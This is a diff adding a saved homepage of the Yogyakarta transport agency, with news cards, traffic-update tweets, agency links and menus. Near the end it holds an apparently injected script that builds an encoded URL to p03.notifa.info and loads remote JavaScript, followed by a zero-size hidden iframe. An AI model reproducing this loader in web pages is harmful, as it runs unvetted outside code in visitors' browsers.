+                    <div class="facebook" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Facebook">
+
+                        <a class="facebook" onclick="window.open(&#39;http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy&#39;, &#39;Facebook&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy">
+                            <i class="fa fa-facebook"></i>
+                        </a>
+
+                    </div>
+                </li>
+                				                <li>
+                    <div class="twitter" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Twitter">
+                        <a class="twitter" onclick="window.open(&#39;http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy&amp;text=Becak%20Listrik%20Diharapkan%20Tingkatkan%20Pariwisata%20DIY&#39;, &#39;Twitter share&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy&amp;text=Becak%20Listrik%20Diharapkan%20Tingkatkan%20Pariwisata%20DIY">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="google-plus" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Google Plus">
+                        <a class="google-plus" onclick="window.open(&#39;https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy&#39;, &#39;Google plus&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy">
+                            <i class="fa fa-google-plus"></i></a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="linkedin" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Linkedin">
+                        <a class="linkedin" onclick="window.open(&#39;http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy&#39;, &#39;Linkedin&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy">
+                            <i class="fa fa-linkedin"></i></a>
+                    </div>
+                </li>
+                            </ul>
+        </div>
+    </div> <!-- /.helix-social-share -->
+
+        <div class="clearfix"></div>
+    </div>
+</article>
+
+        <article class="post masonry_item col-xs-12 col-sm-4 col-md-3 ajax-post" itemscope="" itemtype="http://schema.org/Article" style="position: absolute; left: 877px; top: 0px;">
+    <div class="match-height inner" style="height: 386px;">
+            <div class="article_style">
+			<div class="entry-image intro-image"><a href="http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru" itemprop="url"><img class="post-img" src="./dinas/23-11-2018.jpg" alt="Dishub Tawarkan Solusi Atasi Kepadatan Kendaraan di Kotabaru" itemprop="thumbnailUrl"></a></div></div>
+   			            <div style="height:15px;" class="clearfix"></div>                <h3 class="aga_heading" itemscope="">
+                <a href="http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru" itemprop="url">
+                    <span itemprop="name">
+                        Dishub Tawarkan Solusi Atasi Kepadatan Kendaraan di Kotabaru                    </span>
+                </a>
+                </h3>
+
+
+            <dl class="article-info" itemscope="">
+
+
+                                <dd class="published" itemprop="datePublished">
+                <i class="fa fa-calendar-o"></i>
+                <time class="item-time" data-toggle="tooltip" title="" datetime="2018-11-23T01:54:40+00:00" itemprop="dateCreated" data-original-title="Published Date">Friday, 23 November 2018 01:54           		</time>
+                </dd>
+
+				                			</dl>
+
+
+				                    <div class="helix-social-share">
+        <div class="helix-social-share-blog">
+            <ul>
+            	                <li>
+                    <div class="facebook" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Facebook">
+
+                        <a class="facebook" onclick="window.open(&#39;http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru&#39;, &#39;Facebook&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru">
+                            <i class="fa fa-facebook"></i>
+                        </a>
+
+                    </div>
+                </li>
+                				                <li>
+                    <div class="twitter" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Twitter">
+                        <a class="twitter" onclick="window.open(&#39;http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru&amp;text=Dishub%20Tawarkan%20Solusi%20Atasi%20Kepadatan%20Kendaraan%20di%20Kotabaru&#39;, &#39;Twitter share&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru&amp;text=Dishub%20Tawarkan%20Solusi%20Atasi%20Kepadatan%20Kendaraan%20di%20Kotabaru">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="google-plus" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Google Plus">
+                        <a class="google-plus" onclick="window.open(&#39;https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru&#39;, &#39;Google plus&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru">
+                            <i class="fa fa-google-plus"></i></a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="linkedin" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Linkedin">
+                        <a class="linkedin" onclick="window.open(&#39;http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru&#39;, &#39;Linkedin&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/dishub-tawarkan-solusi-atasi-kepadatan-kendaraan-di-kotabaru">
+                            <i class="fa fa-linkedin"></i></a>
+                    </div>
+                </li>
+                            </ul>
+        </div>
+    </div> <!-- /.helix-social-share -->
+
+        <div class="clearfix"></div>
+    </div>
+</article>
+
+    </div>
+    <input type="hidden" name="count_181" value="4">
+            <div id="timeline_181" class="loader_footer container-fluid readmore clearfix">
+        <button id="ajax_loadmore_181" class="load-more-ajax btn btn-info clearfix">
+            <div class="spinner" style="display:none;">
+                <div class="bounce1"></div>
+                <div class="bounce2"></div>
+                <div class="bounce3"></div>
+            </div>
+            <span class="btn_text">Tampilkan Lebih Banyak</span>
+        </button>
+        </div>
+    </div></div></div></div></div></div></div></div></div></section><section id="section-id-1482798748" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12" id="column-wrap-id-1482798749"><div id="column-id-1482798749" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1482798750" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div></div></div></div></div></div></section><section id="section-id-1482798760" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-md-6" id="column-wrap-id-1482798761"><div id="column-id-1482798761" class="sppb-column  centered"><div class="sppb-column-addons"><div id="sppb-addon-1531110034029" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h3 class="sppb-addon-title">Video Terbaru Dishub DIY</h3><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1531110034024" class="clearfix"><div class="sppb-addon sppb-addon-video "><div class="sppb-video-block sppb-embed-responsive sppb-embed-responsive-16by9"><iframe class="sppb-embed-responsive-item" src="./dinas/o-4dekAYEKA.html" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></div></div></div></div></div></div><div class="sppb-col-md-6" id="column-wrap-id-1530506182958"><div id="column-id-1530506182958" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1530506182983" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h3 class="sppb-addon-title">Twitter ATCS DIY</h3><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1530506182987" class="clearfix"><div class="sppb-addon sppb-addon-tweet sppb-text-center "><div id="sppb-carousel1" class="sppb-carousel sppb-tweet-slider sppb-slide" data-sppb-ride="sppb-carousel"><div class="sppb-carousel-inner"><div class="sppb-item"><small class="sppb-tweet-created">2 Hours ago</small><div class="sppb-item-image"><a href="https://t.co/K410nCRZtZ" target="_blank"><img class="sppb-tweet-image" src="./dinas/DvPEWUvUcAE_Hdd.jpg_thumb" alt="11.27 WIB Kondisi lalu lintas simpang Prambanan terpantau lancar. https://t.co/K410nCRZtZ"></a></div><div class="sppb-tweet-text">11.27 WIB Kondisi lalu lintas simpang Prambanan terpantau lancar. <a href="https://t.co/K410nCRZtZ" target="_blank">https://t.co/K410nCRZtZ</a></div></div><div class="sppb-item active"><small class="sppb-tweet-created">3 Hours ago</small><div class="sppb-tweet-text">10.27 WIB Kondisi lalu lintas simpang Beran dari arah utara terpantau ramai lancar, dari arah selatan terpantau ram… <a href="https://t.co/aenaRtQdQb" target="_blank">https://t.co/aenaRtQdQb</a></div></div><div class="sppb-item"><small class="sppb-tweet-created">3 Hours ago</small><div class="sppb-item-image"><a href="https://t.co/LTiVDB21Qi" target="_blank"><img class="sppb-tweet-image" src="./dinas/DvOyWqaUwAUL4aZ.jpg_thumb" alt="10.08 WIB Kondisi lalu lintas simpang Kleringan arah Malioboro terpantau padat. https://t.co/LTiVDB21Qi"></a></div><div class="sppb-tweet-text">10.08 WIB Kondisi lalu lintas simpang Kleringan arah Malioboro terpantau padat. <a href="https://t.co/LTiVDB21Qi" target="_blank">https://t.co/LTiVDB21Qi</a></div></div><div class="sppb-item"><small class="sppb-tweet-created">3 Hours ago</small><div class="sppb-item-image"><a href="https://t.co/mhtVwqqqik" target="_blank"><img class="sppb-tweet-image" src="./dinas/DvOvMnxV4AAsdgp.jpg_thumb" alt="09.54 WIB Kondisi lalu lintas simpang Melia arah ke utara terpantau ramai. https://t.co/mhtVwqqqik"></a></div><div class="sppb-tweet-text">09.54 WIB Kondisi lalu lintas simpang Melia arah ke utara terpantau ramai. <a href="https://t.co/mhtVwqqqik" target="_blank">https://t.co/mhtVwqqqik</a></div></div><div class="sppb-item"><small class="sppb-tweet-created">3 Hours ago</small><div class="sppb-item-image"><a href="https://t.co/RpKaUhWIPX" target="_blank"><img class="sppb-tweet-image" src="./dinas/DvOtMfrV4AA6GSG.jpg_thumb" alt="09.46 wib kondisi lalu lintas di simpang borobudur plaza terpantau ramai lancar https://t.co/RpKaUhWIPX"></a></div><div class="sppb-tweet-text">09.46 wib kondisi lalu lintas di simpang borobudur plaza terpantau ramai lancar <a href="https://t.co/RpKaUhWIPX" target="_blank">https://t.co/RpKaUhWIPX</a></div></div></div><a href="http://dishub.jogjaprov.go.id/#sppb-carousel1" class="left sppb-carousel-control" role="button" data-slide="prev"><i class="fa fa-angle-left"></i></a><a href="http://dishub.jogjaprov.go.id/#sppb-carousel1" class="right sppb-carousel-control" role="button" data-slide="next"><i class="fa fa-angle-right"></i></a></div></div></div></div></div></div></div></div></section><section id="section-id-1529571832846" class="sppb-section "><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-md-12" id="column-wrap-id-1529571832856"><div id="column-id-1529571832856" class="sppb-column  sppb-wow fadeIn sppb-animated" data-sppb-wow-duration="800ms" data-sppb-wow-delay="200ms" style="visibility: visible; animation-duration: 800ms; animation-delay: 200ms; animation-name: fadeIn;"><div class="sppb-column-addons"><div id="sppb-addon-1529571832857" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h3 class="sppb-addon-title">Link Dinas Terkait</h3><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1529571832858" class="clearfix"><div class="sppb-addon flex desaturate"><div class="slick-carousel-314 clearfix slick-initialized slick-slider"><div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 1172px; transform: translate3d(0px, 0px, 0px);"><div class="slick-img slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" tabindex="0" style="width: 243px;"><a href="https://lpse.jogjaprov.go.id/" target="_blank" tabindex="0"><img src="./dinas/lpse.png" alt="Item 1"></a></div><div class="slick-img slick-slide slick-active" data-slick-index="1" aria-hidden="false" tabindex="0" style="width: 243px;"><a href="http://ppid.jogjaprov.go.id/ppid/" target="_blank" tabindex="0"><img src="./dinas/ppid.png" alt="Item 2"></a></div><div class="slick-img slick-slide slick-active" data-slick-index="2" aria-hidden="false" tabindex="0" style="width: 243px;"><a href="http://kpid.jogjaprov.go.id/" target="_blank" tabindex="0"><img src="./dinas/kpid.png" alt="Item 3"></a></div><div class="slick-img slick-slide slick-active" data-slick-index="3" aria-hidden="false" tabindex="0" style="width: 243px;"><a href="https://komisi-informasi.jogjaprov.go.id/" target="_blank" tabindex="0"><img src="./dinas/kip.png" alt="Item 4"></a></div></div></div></div></div></div></div></div></div></div></div></section><section id="section-id-1482798755" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row sppb-align-center"><div class="sppb-col-sm-8" id="column-wrap-id-1482798756"><div id="column-id-1482798756" class="sppb-column  sppb-wow fadeInDown sppb-animated" data-sppb-wow-duration="1100ms" data-sppb-wow-delay="400ms" style="visibility: visible; animation-duration: 1100ms; animation-delay: 400ms; animation-name: fadeInDown;"><div class="sppb-column-addons"><div id="sppb-addon-1482798757" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h4 class="sppb-addon-title">Ada Keluhan atau Saran untuk Dinas Perhubungan Daerah Istimewa Yogyakarta?</h4><div class="sppb-addon-content"></div></div></div></div></div></div><div class="sppb-col-sm-4" id="column-wrap-id-1482798758"><div id="column-id-1482798758" class="sppb-column  sppb-text-center"><div class="sppb-column-addons"><div id="sppb-addon-1482798759" class="clearfix"><div class="sppb-text-center"><a target="_blank" href="http://dishub.jogjaprov.go.id/keluhan-dan-saran" id="btn-1482798759" class="sppb-btn  page-scroll sppb-btn-custom sppb-btn-lg sppb-btn-rounded" style="margin-left:auto;margin-right:auto;">SAMPAIKAN DI SINI</a></div></div></div></div></div></div></div></section>			</div>
+</div>
+</div></div></div></section><footer id="sp-footer"><div class="container"><div class="row"><div id="sp-footer1" class="col-sm-4 col-md-4"><div class="sp-column "><span class="sp-copyright">© 2018 Dinas Perhubungan D.I. Yogyakarta. All Rights Reserved.</span></div></div><div id="sp-footer3" class="col-sm-4 col-md-4"><div class="sp-column "><div class="sp-module "><div class="sp-module-content">
+
+<div class="custom">
+	<p></p>
+<!-- Histats.com  (div with counter) -->
+<div id="histats_counter"><div id="histats_counter_667" style="display: block;"><a href="http://www.histats.com/viewstats/?sid=4112249&amp;ccid=205" target="_blank"><canvas id="histats_counter_667_canvas" width="253" height="24"></canvas></a></div></div>
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">// <![CDATA[
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4112249,4,205,255,27,00011111']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();
+// ]]></script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4112249&101" alt="" border="0"></a></noscript><!-- Histats.com  END  --></div>
+</div></div></div></div><div id="sp-footer2" class="col-sm-4 col-md-4"><div class="sp-column "><ul class="social-icons"><li><a target="_blank" href="https://www.facebook.com/dinasperhubungandiy/"><i class="fa fa-facebook"></i></a></li><li><a target="_blank" href="https://twitter.com/atcs_diy"><i class="fa fa-twitter"></i></a></li><li><a target="_blank" href="https://www.instagram.com/dishubdiy/"><i class="fa fa-instagram"></i></a></li><li><a target="_blank" href="https://www.youtube.com/channel/UC6uLB8i9F2Vl26r3SJxr_zA"><i class="fa fa-youtube"></i></a></li></ul></div></div></div></div></footer>            </div> <!-- /.body-innerwrapper -->
+        </div> <!-- /.body-wrapper -->
+
+        <!-- Off Canvas Menu -->
+        <div class="offcanvas-overlay"></div><div class="offcanvas-menu">
+            <a href="http://dishub.jogjaprov.go.id/#" class="close-offcanvas" aria-label="Close"><i class="fa fa-remove" aria-hidden="true"></i></a>
+            <div class="offcanvas-inner">
+                                    <div class="sp-module "><div class="sp-module-content"><div class="search flex-search">
+	<form action="http://dishub.jogjaprov.go.id/" method="post">
+		<input name="searchword" id="mod-search-searchword" maxlength="200" class="inputbox search-query" type="text" size="20" placeholder="Search ...">		<input type="hidden" name="task" value="search">
+		<input type="hidden" name="option" value="com_search">
+		<input type="hidden" name="Itemid" value="435">
+	</form>
+</div>
+</div></div><div class="sp-module "><div class="sp-module-content"><ul class="accordion-menu ">
+<li class="item-435 current active"><a href="http://dishub.jogjaprov.go.id/"> Home</a></li><li class="item-436 deeper parent"><a href="http://dishub.jogjaprov.go.id/#"> Profil</a><span class="accordion-menu-toggler collapsed" data-toggle="collapse" data-target="#collapse-menu-436-461"><i class="open-icon fa fa-angle-down"></i></span><ul class="collapse" id="collapse-menu-436-461"><li class="item-441"><a href="http://dishub.jogjaprov.go.id/profil/visi-misi"> Visi &amp; Misi</a></li><li class="item-442"><a href="http://dishub.jogjaprov.go.id/profil/struktur-organisasi"> Struktur Organisasi</a></li><li class="item-443"><a href="http://dishub.jogjaprov.go.id/profil/tupoksi"> Tupoksi</a></li><li class="item-444"><a href="http://dishub.jogjaprov.go.id/profil/lingkup-pekerjaan"> Lingkup Pekerjaan</a></li></ul></li><li class="item-438 deeper parent"><a href="http://dishub.jogjaprov.go.id/#"> Informasi</a><span class="accordion-menu-toggler collapsed" data-toggle="collapse" data-target="#collapse-menu-438-461"><i class="open-icon fa fa-angle-down"></i></span><ul class="collapse" id="collapse-menu-438-461"><li class="item-437"><a href="http://dishub.jogjaprov.go.id/informasi/program-kegiatan"> Program &amp; Kegiatan</a></li><li class="item-446"><a href="http://dishub.jogjaprov.go.id/informasi/realisasi-program"> Realisasi Program &amp; Kegiatan</a></li><li class="item-447"><a href="http://dishub.jogjaprov.go.id/informasi/laporan-keuangan"> Laporan Keuangan</a></li><li class="item-448"><a href="http://dishub.jogjaprov.go.id/informasi/laporan-kinerja"> Laporan Kinerja</a></li><li class="item-449"><a href="http://dishub.jogjaprov.go.id/informasi/produk-hukum"> Produk Hukum</a></li><li class="item-450"><a href="http://dishub.jogjaprov.go.id/informasi/daftar-informasi-publik"> Daftar Informasi Publik</a></li><li class="item-451"><a href="http://dishub.jogjaprov.go.id/informasi/karya-ilmiah"> Hasil Studi</a></li></ul></li><li class="item-439 deeper parent"><a href="http://dishub.jogjaprov.go.id/#"> Bidang &amp; Layanan</a><span class="accordion-menu-toggler collapsed" data-toggle="collapse" data-target="#collapse-menu-439-461"><i class="open-icon fa fa-angle-down"></i></span><ul class="collapse" id="collapse-menu-439-461"><li class="item-492"><a href="http://dishub.jogjaprov.go.id/layanan/bidang-angkutan-darat"> Bidang Angkutan Darat</a></li><li class="item-493"><a href="http://dishub.jogjaprov.go.id/layanan/bidang-lalu-lintas"> Bidang Lalu Lintas</a></li><li class="item-494"><a href="http://dishub.jogjaprov.go.id/layanan/bidang-perhubungan-udara-keselamatan-transportasi"> Bidang Perhubungan Udara &amp; Keselamatan Transportasi</a></li><li class="item-495"><a href="http://dishub.jogjaprov.go.id/layanan/upt-trans-jogja"> UPT Trans Jogja</a></li><li class="item-496"><a href="http://dishub.jogjaprov.go.id/layanan/upt-kpllaj"> UPT KPLLAJ</a></li></ul></li><li class="item-440"><a href="http://dishub.jogjaprov.go.id/berita"> Berita</a></li><li class="item-452 deeper parent"><a href="http://dishub.jogjaprov.go.id/#"> Galeri</a><span class="accordion-menu-toggler collapsed" data-toggle="collapse" data-target="#collapse-menu-452-461"><i class="open-icon fa fa-angle-down"></i></span><ul class="collapse" id="collapse-menu-452-461"><li class="item-497"><a href="http://dishub.jogjaprov.go.id/galeri/galeri-foto"> Galeri Foto</a></li><li class="item-498"><a href="http://dishub.jogjaprov.go.id/galeri/galeri-video"> Galeri Video</a></li></ul></li><li class="item-455"><a href="http://dishub.jogjaprov.go.id/kontak"> Kontak Kami</a></li></ul>
+</div></div>
+                                </div> <!-- /.offcanvas-inner -->
+        </div> <!-- /.offcanvas-menu -->
+
+
+
+        <!-- Preloader -->
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdVqsv9FnPWxgpf2FZUEFl1fYSqKyNK3v3du5sjgh80kSApGRoYYKscp9LAb7PIpI4Eb3CQBtpAzUGrdL2JJYBjBG7Tct7Zx%2fbw7RKIY3biDTkrNtHgvSeGflAemq5LaBPYTg%2fhZu0JqPu15O7Pll48ocsu4KKUY9ZvuGBl40NAL8ekxAds%2fc22LE8VpLA%2fCvHa3uRswR15FVcZqSaYP3d22ZIVlCy0evTb9Sl4F8sGM5SHUCZuutUYB%2bKYbng8W3hFu8ZWn1JlIOtDe6XmHxmwzeJ5F9uyGuprX1odLcLkobcj0U1B6t7jgrKXFt0mPNCUdATGfZO2yegL8rQ0YzkknpcHBxSOSoECgyVRhSCEtzTzCMHYmhHeRMUXPlunY%2bH8k%2fYNbgtC75lWOtI2t%2bufDt%2fADrVuzNgoEkC3z7zXVJPYQ9DQcS5uUHWKumQiWDRBHip19cKJBz%2b8vspQmbBPMY9v4xFYYFCnDwPEhrfxKPeA5FD4lO3Z0P6mvGrUnjkC%2fVo1fri86aXjjgTb9QTJKjTYLI9xX74dLOBaef8bWw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<a href="http://dishub.jogjaprov.go.id/#top" id="scroll-top" class="open"><i class="pe-7s-angle-up"></i></a><script async="" type="text/javascript" src="./dinas/4112249.php"></script><iframe id="ifrm" scrolling="no" src="./dinas/log.html" style="height: 0px; width: 0px; overflow: hidden; border: 0px; padding: 0px;"></iframe><script async="" type="text/javascript" src="./dinas/cc_205.js.download"></script></body></html>
